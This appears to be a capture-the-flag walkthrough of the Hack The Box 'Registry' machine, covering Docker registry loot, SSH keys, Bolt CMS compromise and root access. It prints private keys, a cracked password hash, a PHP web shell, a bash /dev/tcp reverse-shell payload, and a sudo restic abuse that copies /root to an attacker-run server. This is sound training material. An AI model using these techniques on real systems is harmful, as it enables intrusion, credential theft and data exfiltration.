+f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
+RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
+94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
+-----END RSA PRIVATE KEY-----
+==================================================================================================================================
+
+We also find the username in the public key entry.
+Commands and Output:
+==================================================================================================================================
+root@bdaaa5fa326a:~# cat .ssh/id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQ0QB2PXyb2AUShspjygtkqjzXFuX0dbayPI/irOEYCAOtgQs+nb9Ij3vZZX+LMPpNtWJaGF+ti/5gTjnhfjyNji7L/3Se6aIJAqMlFqkf+E5xKntRlM9dpqMMNRLgAYAKW5lj5OciQ7ZaXx7btoYLiQHlxXbj8RwEirWuFqwbi2lznckAU9Ua1DSu6yKdqIIpkB2FvJVFakTS32FagJ+rGm9TIWeiOPaQvKhyXQ0jeBL4Sdi5PmhLtkdOEWVgYVSoWaOythA3J2c1UAhfl5dLGS0FuD4Dv46xyrI8H7gpAexa1yF3Kei4PTHBEIQxscejsfCEOVZwe4sngYKrU7o6sf0rWpOf7jHuEUMCZVQgQ55fvv10P6CA2qhPQ/bpKzp2pGXRb1Xdr6v+ObgQ4knkK1GKqOegOane0wyhD5RFQF/NeYBqt1UIM2KigDv9foENc7p9HhHGFoWJEzyOeWCm4QcSg9H2ZgfZRAhCoiEijHh19SdNh9wanydkaj9H7iTsvNDi8ON4sLRGjVBsfPLl+UjIIsHU+bG+pxHUzb65yHJ8iFX+DndJncdbQs6X9Ckii58ElBmkSUDSZpFsOV81vVk6qdGm+EBcpVO09YsC03nUj1VEHtQG8hOG/tJqesB50I5Gbi7+V2qZit3ZZOvkhVF5l2N0U9asjSpIT5Bmow== bolt@registry.htb
+==================================================================================================================================
+
+We can check /home to see if there any other user ie there are none also check /var/www/html and see what we find
+Commands and Output:
+==================================================================================================================================
+root@bdaaa5fa326a:~# ls -la /var/www/html/
+total 8
+drwxr-xr-x 1 root root  34 May 25  2019 .
+drwxr-xr-x 1 root root   8 May 25  2019 ..
+-rw-r--r-- 1 root root 612 May 25  2019 index.html
+-rwxr-xr-x 1 root root  53 May 25  2019 sync.sh
+root@bdaaa5fa326a:~# cat .   
+./             ../            .bash_history  .bashrc        .profile       .ssh/          .viminfo       
+root@bdaaa5fa326a:~# cd /var/www/html/
+root@bdaaa5fa326a:/var/www/html# cat sync.sh 
+#!/bin/bash
+rsync -azP registry:/var/www/html/bolt .
+root@bdaaa5fa326a:/var/www/html# ls
+index.html  sync.sh
+==================================================================================================================================
+
+THe sync.sh is going to the registry box and using ssh
+Commands and Output:
+==================================================================================================================================
+root@bdaaa5fa326a:~/.ssh# ls
+config  id_rsa  id_rsa.pub  known_hosts
+root@bdaaa5fa326a:~/.ssh# cat config 
+Host registry
+  User bolt
+  Port 22
+  Hostname registry.htb
+==================================================================================================================================
+
+May 25 seems to be an interesting date and also May 6 2019, so maybe may 6 between may 26
+Commands and Output:
+==================================================================================================================================
+root@bdaaa5fa326a:/# find / -type f -newermt 2019-05-05 ! -newermt 2019-05-26 -ls 2>/dev/null | grep -v ' /var/'
+     3982      4 -rw-r--r--   1 root     root         1208 May 25  2019 /etc/pam.d/common-account
+     3983      4 -rw-r--r--   1 root     root         1249 May 25  2019 /etc/pam.d/common-auth
+     3984      4 -rw-r--r--   1 root     root         1440 May 25  2019 /etc/pam.d/common-password
+     3985      4 -rw-r--r--   1 root     root         1437 May 25  2019 /etc/pam.d/common-session
+     3986      4 -rw-r--r--   1 root     root         1435 May 25  2019 /etc/pam.d/common-session-noninteractive
+    13821      4 -rwxr-xr-x   1 root     root          222 May 25  2019 /etc/profile.d/01-ssh.sh
+     3819      8 -rw-r--r--   1 root     root         5898 May 25  2019 /etc/ca-certificates.conf
+     3912      4 -rw-r--r--   1 root     root          473 May 25  2019 /etc/group
+     3913      4 -rw-r--r--   1 root     root          486 May 25  2019 /etc/group-
+     3914      4 -rw-r-----   1 root     shadow        395 May 25  2019 /etc/gshadow
+     3915      4 -rw-r-----   1 root     shadow        404 May 25  2019 /etc/gshadow-
+     3940     16 -rw-r--r--   1 root     root        14594 May 25  2019 /etc/ld.so.cache
+     3952      4 -rw-r--r--   1 root     root         2514 May 25  2019 /etc/mailcap
+     3987      4 -rw-r--r--   1 root     root          926 May 25  2019 /etc/passwd
+     3988      4 -rw-r--r--   1 root     root          963 May 25  2019 /etc/passwd-
+     4124      4 -rw-r-----   1 root     shadow        501 May 25  2019 /etc/shadow
+     4125      4 -rw-r-----   1 root     shadow        527 May 25  2019 /etc/shadow-
+     4361    204 -rw-r--r--   1 root     root       207436 May 25  2019 /etc/ssl/certs/ca-certificates.crt
+     4396      4 -rw-r--r--   1 root     root         1046 May 25  2019 /etc/ssl/certs/ssl-cert-snakeoil.pem
+     4402      4 -rw-r-----   1 root     ssl-cert     1704 May 25  2019 /etc/ssl/private/ssl-cert-snakeoil.key
+     4403      0 -rw-r--r--   1 root     root            0 May 25  2019 /etc/subgid
+     4404      4 -rw-r--r--   1 root     root           18 May 25  2019 /etc/subgid-
+     4405      0 -rw-r--r--   1 root     root            0 May 25  2019 /etc/subuid
+     4406      4 -rw-r--r--   1 root     root           18 May 25  2019 /etc/subuid-
+     4413      4 -rw-r--r--   1 root     root           14 May 25  2019 /etc/timezone
+     4455      4 -rw-r--r--   1 root     root          148 May 25  2019 /root/.profile
+     4457      4 -rw-r--r--   1 root     root           60 May 25  2019 /root/.ssh/config
+     4458      4 -rw-------   1 root     root         3326 May 25  2019 /root/.ssh/id_rsa
+     4459      4 -rw-r--r--   1 root     root          743 May 25  2019 /root/.ssh/id_rsa.pub
+     4460      4 -rw-r--r--   1 root     root          444 May 25  2019 /root/.ssh/known_hosts
+    13818      4 -rw-------   1 root     root         1061 May 25  2019 /root/.viminfo
+     4464      4 -rw-r--r--   1 root     root            6 May 25  2019 /run/nginx.pid
+     4466      4 -rw-r--r--   1 root     root            5 May 25  2019 /run/php/php7.2-fpm.pid
+     5645    500 -rw-r--r--   1 root     root       510408 May 16  2019 /usr/lib/x86_64-linux-gnu/libcurl-gnutls.so.4.5.0
+     7165      4 -rw-r--r--   1 root     root         1615 May 16  2019 /usr/share/doc/libcurl3-gnutls/changelog.Debian.gz
+==================================================================================================================================
+
+We see /etc/profile.d/01-ssh.sh and we see the expect script we saw originally
+Commands and Output:
+==================================================================================================================================A
+root@bdaaa5fa326a:/# cat /etc/profile.d/01-ssh.sh
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect "Enter passphrase for /root/.ssh/id_rsa:"
+send "GkOcz221Ftb3ugog\n";
+expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
+interact
+==================================================================================================================================
+
+We can use the password in conjuction with the ssh key we found rather than trying to crack the ssh key.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/ssh]
+└──╼ $ssh -i bolt_rsa bolt@10.10.10.159
+The authenticity of host '10.10.10.159 (10.10.10.159)' can't be established.
+ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.159' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'bolt_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+  System information as of Mon May 17 03:36:23 UTC 2021
+
+  System load:  0.08               Users logged in:                0
+  Usage of /:   24.6% of 13.53GB   IP address for eth0:            10.10.10.159
+  Memory usage: 14%                IP address for docker0:         172.17.0.1
+  Swap usage:   0%                 IP address for br-1bad9bd75d17: 172.18.0.1
+  Processes:    167
+Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
+bolt@bolt:~$ id
+uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
+bolt@bolt:~$ ls
+user.txt
+bolt@bolt:~$ cat user.txt
+==================================================================================================================================
+
+".viminfo" also important since it provides history of files edited by vim.
+
+We go to /var/www/html and find backup.php
+Commands and Output:
+==================================================================================================================================
+bolt@bolt:/var/www/html$ cat backup.php 
+<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
+==================================================================================================================================
+
+We try to sudo using the passphrase we got before which does not work or escalate to www-data user.
+Commands and Output:
+==================================================================================================================================
+bolt@bolt:/var/www/html$ ls -la
+total 28
+drwxrwxr-x  4 www-data www-data 4096 Apr  6 11:15 .
+drwxr-xr-x  4 root     root     4096 Apr  6 11:15 ..
+-rw-r--r--  1 root     root       85 May 25  2019 backup.php
+-rw-------  1 git      www-data    0 Oct  8  2019 .bash_history
+drwxrwxr-x 11 www-data www-data 4096 Apr  6 11:15 bolt
+-rwxrwxr-x  1 www-data www-data  612 May  6  2019 index.html
+-rw-r--r--  1 root     root      612 Oct 21  2019 index.nginx-debian.html
+drwxr-xr-x  2 root     root     4096 Apr  6 11:15 install
+==================================================================================================================================
+
+We also see git owned files with .bash_history, most likely want to find something owned by the user git.
+We don't find much, www-data most likley has sudo privileges without a password since it is doing the backup.
+
+After going back and looking at the results from the gobuster we find the bolt directory which shows us a sample website using
+bolt, from there we find that it was built using bolt based on google search it has a login page at bolt subdirectory
+Commands and Output:
+==================================================================================================================================
+ © 2021 • This website is Built with Bolt.
+ http://registry.htb/bolt/bolt/login
+==================================================================================================================================
+
+Bolt might be vulnerable to something we can do a searchsploit to find out
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry/http/tmp/etc/profile.d]
+└──╼ $searchsploit bolt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow                                | multiple/dos/41869.html
+Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                            | php/webapps/47501.txt
+Bolt CMS 3.6.4 - Cross-Site Scripting                                                                   | php/webapps/46495.txt
+Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                                     | php/webapps/46664.html
+Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                                    | php/webapps/48296.py
+Bolt CMS < 3.6.2 - Cross-Site Scripting                                                                 | php/webapps/46014.txt
+Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                                                 | multiple/remote/24982.txt
+BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/36552.txt
+BoltWire 6.03 - Local File Inclusion                                                                    | php/webapps/48411.txt
+Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                                             | php/webapps/21132.txt
+CMS Bolt - Arbitrary File Upload (Metasploit)                                                           | php/remote/38196.rb
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Result
+==================================================================================================================================
+
+However we still don't know the version, using wapplyzer we see it's using the Bolt CMS. PHP cms.
+
+If we look at the changelog.md on the server as the bolt user it is probably running version 3.6.4
+Commands and Output:
+==================================================================================================================================
+bolt@bolt:/var/www/html/bolt$ head -20 changelog.md 
+Changelog for Bolt 3.x
+======================
+
+Bolt 3.6.4
+----------
+
+Released: 2019-01-24. Notable changes:
+
+ - Fixed asset url generation for Bolt install in subfolder. [#7725](https://github.com/bolt/bolt/pull/7725)
+ - Fixed: DBAL Sqlite schema diff bug, still needed on DBAL 2.9. [#7733](https://github.com/bolt/bolt/pull/7733)
+ - Fixed: Ignore default value alteration for MySQL `TEXT` and `BLOB` types. [#7477](https://github.com/bolt/bolt/pull/7477)
+ - Updated: Updates to `bolt/thumbs` and `bolt/filesystem`.
+ - Updated: Various updates to Symfony components, Composer packages and Front-end dependencies.
+
+Bolt 3.6.3
+----------
+
+Released: 2018-12-12. Notable changes:
+
+ - Fixed: Add missing status filter. [#7719](https://github.com/bolt/bolt/pull/7719)
+==================================================================================================================================
+
+We can now grab a copy of one of the exploits like the rce we found earlier for bolt
+Based on the output from the exploit once logged in we can probably upload and get code execution.
+
+We have to figure out how to login with bolt.
+Commands and Output:
+==================================================================================================================================
+find . | grep -i database
+..
+..
+..
+./app/database
+./app/database/.gitignore
+./app/database/bolt.db
+./app/view/twig/exception/database
+./app/view/twig/exception/database/exception.twig
+./app/view/twig/exception/database/_failed-connect.twig
+..
+..
+..
+==================================================================================================================================
+
+We see app database bolt.db. We can host a webserver on the box via python and download the database file and analze it locally with
+sqlite3
+
+Commands and Output:
+==================================================================================================================================
+└──╼ $sqlite3 bolt.db 
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hints.
+sqlite> .dump
+sqlite> .tables
+bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
+bolt_blocks       bolt_homepage     bolt_relations  
+bolt_cron         bolt_log_change   bolt_showcases  
+bolt_entries      bolt_log_system   bolt_taxonomy   
+sqlite> select * from bolt_users;
+1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
+
+==================================================================================================================================
+
+We find a user and password hash. This is some type of bcrypt.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $hashcat -m 3200 hash.txt /opt/SecLists/rockyou.txt --force
+..
+..
+..
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => Dictionary cache hit:
+* Filename..: /opt/SecLists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry
+
+..
+..
+==================================================================================================================================
+
+We get the password as strawberry.
+
+Now we sign in and try to do the RCE through file upload. We make a php file that we want to upload under file management, however
+we don't have the correct extension type.
+Commands and Output:
+==================================================================================================================================
+
+File Management
+File 'shell.php' could not be uploaded (wrong/disallowed file type). Make sure the file extension is one of the following:.twig .html .js .css .scss .gif .jpg .jpeg .png .ico .zip .tgz .txt .md .doc .docx .pdf .epub .xls .xlsx .ppt .pptx .mp3 .ogg .wav .m4a .mp4 .m4v .ogv .wmv .avi .webm .svg
+==================================================================================================================================
+
+So what it was doing was going to the config and editing the extension types. Found in:
+http://registry.htb/bolt/bolt/file/edit/config/config.yml
+Commands and Output:
+==================================================================================================================================
+# Define the file types (extensions to be exact) that are acceptable for upload
+# in either 'file' fields or through the 'files' screen. Note that certain file-
+# types are never acceptable, even if they are in this list. These types are
+# never allowed: sh, asp, cgi, php, php3, ph3, php4, ph4, php5, ph5, phtm, phtml
+accept_file_types: [ php, twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg]
+==================================================================================================================================
+
+Now we can attempt to upload the file.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $cat shell.php 
+<?php system($_REQUEST['cmd']); ?>
+
+..
+..
+..
+
+http://registry.htb/bolt/files/shell.php?82ad72d9f7&cmd=id
+
+..
+..
+..
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+==================================================================================================================================
+
+However after a number of uses, the backup file is being reset so we have to reupload the php file.
+We try a rverse shell however that does not work, if look at the iptables rules
+Commands and Output:
+==================================================================================================================================
+bolt@bolt:/etc$ cat iptables.conf 
+# Generated by iptables-save v1.6.1 on Thu Oct 17 10:06:56 2019
+*nat
+:PREROUTING ACCEPT [11:688]
+:INPUT ACCEPT [11:688]
+:OUTPUT ACCEPT [852:60498]
+:POSTROUTING ACCEPT [852:60498]
+:DOCKER - [0:0]
+-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
+-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
+-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
+-A POSTROUTING -s 172.18.0.0/16 ! -o br-1bad9bd75d17 -j MASQUERADE
+-A POSTROUTING -s 172.18.0.2/32 -d 172.18.0.2/32 -p tcp -m tcp --dport 5000 -j MASQUERADE
+-A DOCKER -i docker0 -j RETURN
+-A DOCKER -i br-1bad9bd75d17 -j RETURN
+-A DOCKER -d 127.0.0.1/32 ! -i br-1bad9bd75d17 -p tcp -m tcp --dport 5000 -j DNAT --to-destination 172.18.0.2:5000
+COMMIT
+# Completed on Thu Oct 17 10:06:56 2019
+# Generated by iptables-save v1.6.1 on Thu Oct 17 10:06:56 2019
+*filter
+:INPUT ACCEPT [894:63784]
+:FORWARD DROP [0:0]
+:OUTPUT ACCEPT [891:64072]
+:DOCKER - [0:0]
+:DOCKER-ISOLATION-STAGE-1 - [0:0]
+:DOCKER-ISOLATION-STAGE-2 - [0:0]
+:DOCKER-USER - [0:0]
+-A FORWARD -j DOCKER-USER
+-A FORWARD -j DOCKER-ISOLATION-STAGE-1
+-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+-A FORWARD -o docker0 -j DOCKER
+-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
+-A FORWARD -i docker0 -o docker0 -j ACCEPT
+-A FORWARD -o br-1bad9bd75d17 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+-A FORWARD -o br-1bad9bd75d17 -j DOCKER
+-A FORWARD -i br-1bad9bd75d17 ! -o br-1bad9bd75d17 -j ACCEPT
+-A FORWARD -i br-1bad9bd75d17 -o br-1bad9bd75d17 -j ACCEPT
+-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
+-A OUTPUT -d 10.0.0.0/8 -p udp -j DROP
+-A DOCKER -d 172.18.0.2/32 ! -i br-1bad9bd75d17 -o br-1bad9bd75d17 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
+-A DOCKER-ISOLATION-STAGE-1 -i br-1bad9bd75d17 ! -o br-1bad9bd75d17 -j DOCKER-ISOLATION-STAGE-2
+-A DOCKER-ISOLATION-STAGE-1 -j RETURN
+-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -o br-1bad9bd75d17 -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -j RETURN
+-A DOCKER-USER -j RETURN
+COMMIT
+# Completed on Thu Oct 17 10:06:56 2019
+==================================================================================================================================
+
+The rules are preventing us from doing a 3 way handshake bassed on the OUPUT rules as well as UDP on outbound connections.
+
+So given that scenario what we could do is use netcat on the localhost using the bolt user ssh connection and wait for the shell
+locally to cirumvent the firewall rules.
+
+On burp we change the request type to POST and url encode the payload, also saving the config file and reuploading the shell.
+Commands and Output:
+==================================================================================================================================
+POST /bolt/files/shell.php HTTP/1.1
+Host: registry.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: bolt_session_d5575a759f2eb78cbf8e75d8017c193b=83fb7542a07302666e4726318a; bolt_authtoken_d5575a759f2eb78cbf8e75d8017c193b=ea695902189b99a043f6202d55d14d189863e6b6e18b3744ada0e11334c682df
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+
+4d94cf8886=&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/127.0.0.1/9001+0>%261'
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+bolt@bolt:/etc$ nc -lnvp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Connection from 127.0.0.1 47824 received!
+bash: cannot set terminal process group (1132): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bolt:~/html/bolt/files$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+==================================================================================================================================
+
+Now that we are in we can look at the backup.php file 
+Commands and Output:
+==================================================================================================================================
+www-data@bolt:~/html$ cat backup.php 
+<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
+www-data@bolt:~/html$ sudo -l
+Matching Defaults entries for www-data on bolt:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bolt:
+    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+==================================================================================================================================
+
+Now we we have to find a way to abuse it. We look up restic and we will need to setup a restic server alongside with port forwarding 
+in order to by pass the iptables rules that are established.
+
+First we get to make ssh forwarding. We enter "~C" to enter the ssh hidden menu.
+Commands and Output:
+==================================================================================================================================
+www-data@bolt:~/html$ 
+ssh> -R 8000:127.0.0.1:8000
+Forwarding port.
+
+==================================================================================================================================
+
+Now we have forward the port 8000 on the box and it will forwarded it to the attacker on through the ssh tunnel.
+We now have to setup our restic server to use for the sudo command.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $sudo apt install restic
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $restic init -r ./data/
+enter password for new repository: 
+enter password again: 
+created restic repository 0b0bbaf036 at ./data/
+
+Please note that knowledge of your password is required to access
+the repository. Losing your password means that your data is
+irrecoverably lost.
+
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $ls data/
+config  data  index  keys  locks  snapshots
+==================================================================================================================================
+
+Now we have to setup the restic server.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $docker run -p 8000:8000 -v /home/user/htb/registry/data/:/data -it restic/rest-server sh
+Unable to find image 'restic/rest-server:latest' locally
+latest: Pulling from restic/rest-server
+df20fa9351a1: Pull complete 
+0695b38c0e60: Pull complete 
+5ad1097f6304: Pull complete 
+8501f40c92c7: Pull complete 
+10e036b66b42: Pull complete 
+7ee0cf106118: Pull complete 
+Digest: sha256:7f5bbeec68db1d8a46f7e52810778053991c69f8da659e60c4ac1bb59cbcd987
+Status: Downloaded newer image for restic/rest-server:latest
+/ # 
+==================================================================================================================================
+
+Now we have a restic server on our box, we point it to data and run the server 
+Commands and Output:
+==================================================================================================================================
+/ # rest-server --path /data --no-auth
+Data directory: /data
+Authentication disabled
+Private repositories disabled
+Starting server on :8000
+==================================================================================================================================
+
+Now we go back the www-data user and run the sudo command
+Commands and Output:
+==================================================================================================================================
+www-data@bolt:~/html$ /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ bolt
+enter password for repository: 
+password is correct
+unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
+scan [/var/www/html/bolt]
+scanned 3145 directories, 14349 files in 0:00
+[0:51] 100.00%  230.096 MiB / 230.096 MiB  17494 / 17494 items  0 errors  ETA 0:00 
+duration: 0:51
+snapshot 773b70e1 saved
+
+==================================================================================================================================
+
+We now make restore directory to use for data, you might run into issues restoring using a noral user so switch to root.
+Commands and Output:
+==================================================================================================================================
+mkdir restore
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $restic -r data/ restore latest --target restore/
+enter password for repository: 
+repository 0b0bbaf0 opened successfully, password is correct
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 552.330144ms: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 1.080381816s: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 1.31013006s: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 1.582392691s: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 2.340488664s: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+Load(<index/ef850da223>, 0, 0) returned error, retrying after 4.506218855s: open data/index/ef850da2237ba87adc08814a51f7293f083a539c5d2dd26f39f6f2e8cca8eea9: permission denied
+  signal interrupt received, cleaning up
+┌─[✗]─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $sudo !!
+sudo restic -r data/ restore latest --target restore/
+[sudo] password for user: 
+enter password for repository: 
+repository 0b0bbaf0 opened successfully, password is correct
+created new cache in /root/.cache/restic
+restoring <Snapshot 773b70e1 of [/var/www/html/bolt] at 2021-05-17 05:52:29.216284753 +0000 UTC by www-data@bolt> to restore/
+==================================================================================================================================
+
+Now that we have created a backup of bolt and proved it we can go ahead and make a backup of the "/root" directory.
+Commands and Output:
+==================================================================================================================================
+www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root
+enter password for repository: 
+password is correct
+found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
+scan [/root]
+scanned 10 directories, 13 files in 0:00
+[0:00] 100.00%  27.856 KiB / 27.856 KiB  23 / 23 items  0 errors  ETA 0:00 
+duration: 0:00
+snapshot 6878c215 saved
+www-data@bolt:~/html$
+==================================================================================================================================
+
+Now we can restore the root directory on our local box.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $sudo restic -r data/ restore latest --target restore/
+enter password for repository: 
+repository 0b0bbaf0 opened successfully, password is correct
+restoring <Snapshot 6878c215 of [/root] at 2021-05-17 06:05:10.045149951 +0000 UTC by root@bolt> to restore/
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $sudo restic -r data/ restore latest --target restore/
+enter password for repository: 
+repository 0b0bbaf0 opened successfully, password is correct
+restoring <Snapshot 6878c215 of [/root] at 2021-05-17 06:05:10.045149951 +0000 UTC by root@bolt> to restore/
+┌─[user@parrot-virtual]─[~/htb/registry]
+└──╼ $cd restore/
+┌─[user@parrot-virtual]─[~/htb/registry/restore]
+└──╼ $ls
+bolt  root
+┌─[user@parrot-virtual]─[~/htb/registry/restore]
+└──╼ $cd root/
+bash: cd: root/: Permission denied
+┌─[user@parrot-virtual]─[~/htb/registry/restore]
+└──╼ $sudo su
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore]
+└──╼ #cd root/
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore/root]
+└──╼ #ls
+config.yml  cron.sh  root.txt
+
+==================================================================================================================================
+
+We also find a .ssh directory which contains ssh keys we can use to get on the box as root.
+Commands and Output:
+==================================================================================================================================
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore/root]
+└──╼ #ls -la
+total 48
+drwx------ 1 root root   196 Apr  6 04:15 .
+drwxr-xr-x 1 user user    16 May 16 23:03 ..
+lrwxrwxrwx 1 root root     9 May 28  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 root root  3106 Sep 26  2019 .bashrc
+drwx------ 1 root root    40 Apr  6 04:15 .cache
+drwxr-xr-x 1 root root    16 Apr  6 04:15 .config
+-rw-r--r-- 1 root root 20999 Oct 21  2019 config.yml
+-rw-r--r-- 1 root root   118 Oct 21  2019 cron.sh
+drwx------ 1 root root    34 Apr  6 04:15 .gnupg
+drwxr-xr-x 1 root root    10 Apr  6 04:15 .local
+-rw-r--r-- 1 root root   148 Aug 17  2015 .profile
+-r-------- 1 root root    33 Sep 26  2019 root.txt
+-rw-r--r-- 1 root root    66 Oct 21  2019 .selected_editor
+drwxr-xr-x 1 root root    62 Apr  6 04:15 .ssh
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore/root]
+└──╼ #cat .ssh/
+authorized_keys  id_rsa           id_rsa.pub       
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore/root]
+└──╼ #cat .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm
+cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci
+4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp
+1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX
+4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+
+IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG
+sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC
+BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D
